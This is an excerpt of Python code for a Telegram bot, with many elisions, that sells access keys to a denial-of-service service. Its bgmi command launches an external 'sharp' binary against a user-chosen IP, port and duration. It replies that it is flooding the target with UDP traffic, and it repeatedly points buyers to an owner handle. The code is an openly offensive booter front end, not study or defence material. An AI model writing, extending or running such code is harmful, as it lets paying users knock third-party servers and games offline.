...
async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key. Buy key from @VOIDxARITRAXD\nCLICK IN /help")
        return
    ...
    command = ['./sharp', target_ip, str(port), str(duration)]  # Ensure port and duration are strings when passed to command
    ...
    await update.message.reply_text(f'Attack started:\nFlooding {target_ip}:{port} for {duration} seconds using sharp binary, UDP flood, and Super UDP. OWNER- @VOIDxARITRAXD')
...
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if user_id not in user_processes or user_processes[user_id]["process"].poll() is not None:
        await update.message.reply_text('No flooding process is running.OWNER @VOIDxARITRAXD\nCLICK IN /help')
        return
...
async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if user_id in ADMIN_IDS:
        ...
        response = "ONLY OWNER CAN USE💀OWNER @VOIDxARITRAXD"
...
async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if len(command) == 1:
        ...
        if key in keys:
            ...
            del keys[key]
            save_keys()
            response = f"✅Key redeemed successfully! Access granted until: {users[user_id]} OWNER- @VOIDxARITRAXD..."
        else:
            response = "Invalid or expired key buy from @VOIDxARITRAXD."
    else:
...
async def owner(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📞 Contact the owner: @VOIDxARITRAXD")
